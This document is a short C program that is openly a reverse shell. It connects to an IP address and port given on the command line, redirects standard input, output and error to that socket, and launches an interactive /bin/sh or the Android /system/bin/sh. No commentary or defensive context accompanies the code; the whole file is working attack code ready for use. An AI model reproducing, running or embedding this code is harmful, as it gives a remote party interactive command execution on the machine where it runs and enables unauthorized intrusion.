#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
 
int main (int argc, char **argv)
{
	int scktd;
	struct sockaddr_in client;
 
	if(argc!=3){
		printf("Usage: IP PORT");
		return -1;
	}
	client.sin_family = AF_INET;
	client.sin_addr.s_addr = inet_addr(argv[1]);
 	client.sin_port = htons(atoi(argv[2]));

	scktd = socket(AF_INET,SOCK_STREAM,0);
	connect(scktd,(struct sockaddr *)&client,sizeof(client));

	dup2(scktd,0); // STDIN
	dup2(scktd,1); // STDOUT
	dup2(scktd,2); // STDERR

	if( access( "/bin/sh", F_OK ) == 0 ) {
		execl("/bin/sh","sh","-i",NULL,NULL);
	}
	if( access( "/system/bin/sh", F_OK ) == 0 ) {
		execl("/system/bin/sh","sh","-i",NULL,NULL);
	}

	printf("reverse shell finished\n");
	return 0;
}